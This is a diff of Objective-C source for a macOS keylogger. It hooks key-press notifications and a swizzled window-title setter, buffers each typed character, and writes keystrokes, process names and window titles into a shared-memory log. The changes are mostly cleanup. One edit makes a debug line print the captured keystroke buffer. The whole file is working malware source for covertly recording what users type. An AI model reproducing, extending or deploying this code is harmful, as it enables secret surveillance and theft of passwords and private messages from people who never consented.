@@ -28,7 +28,6 @@ u_int gPrevStringLen               = 0;
   if (self != nil)
     {
       gKeylogLock = [[NSLock alloc] init];
-      
       return self;
     }
 }
@@ -36,14 +35,15 @@ u_int gPrevStringLen               = 0;
 - (void)dealloc
 {
   [gKeylogLock release];
-  
   [super dealloc];
 }
 
 - (void)keyPressed: (NSNotification *)aNotification
 {
   if (mBufferString == nil)
-    mBufferString = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
+    {
+      mBufferString = [[NSMutableString alloc] init];
+    }
     
   NSString *_fullText   = [[aNotification object] text];
   NSString *_singleChar;
@@ -86,23 +86,21 @@ u_int gPrevStringLen               = 0;
       else
         {
 #ifdef DEBUG
-          NSLog(@"[keylogger] Logging 0x10 characters");
+          NSLog(@"[keylogger] Logging: %@", mBufferString);
 #endif
           logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
-          
           NSMutableData *entryData = [[NSMutableData alloc] init];
           
           shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
           short unicodeNullTerminator = 0x0000;
           
           if (gContextHasBeenSwitched < 2)
-            gContextHasBeenSwitched++;
+            {
+              gContextHasBeenSwitched++;
+            }
           
           if (gContextHasBeenSwitched == 1)
             {
-#ifdef DEBUG
-              NSLog(@"Writing block header");
-#endif
               //gContextHasBeenSwitched = FALSE;
               NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
               NSString *_processName      = [[processInfo processName] copy];
@@ -112,7 +110,7 @@ u_int gPrevStringLen               = 0;
               
               processName  = [[NSMutableData alloc] initWithData:
                               [_processName dataUsingEncoding:
-                               NSUTF16LittleEndianStringEncoding]];
+                              NSUTF16LittleEndianStringEncoding]];
               
               // Dummy word
               short dummyWord = 0x0000;
@@ -217,7 +215,7 @@ u_int gPrevStringLen               = 0;
           [entryData release];
           [contentData release];
           
-          mBufferString = [[NSMutableString alloc] initWithCapacity: KEY_MAX_BUFFER_SIZE];
+          mBufferString = [[NSMutableString alloc] init];
           [mBufferString appendString: _singleChar];
         }
         
@@ -237,11 +235,6 @@ u_int gPrevStringLen               = 0;
 
 - (void)setTitleHook: (NSString *)arg1
 {
-#ifdef DEBUG
-  NSLog(@"%s set Title called: %@", __FUNCTION__, arg1);
-  NSLog(@"gWindowTitle %@", [gWindowTitle class]);
-#endif
-
   [gKeylogLock lock];
   
   if (gWindowTitle != nil && [gWindowTitle isKindOfClass: [NSString class]])
@@ -259,7 +252,6 @@ u_int gPrevStringLen               = 0;
     }
     
   [gKeylogLock unlock];
-  
   [self setTitleHook: arg1];
 }
 
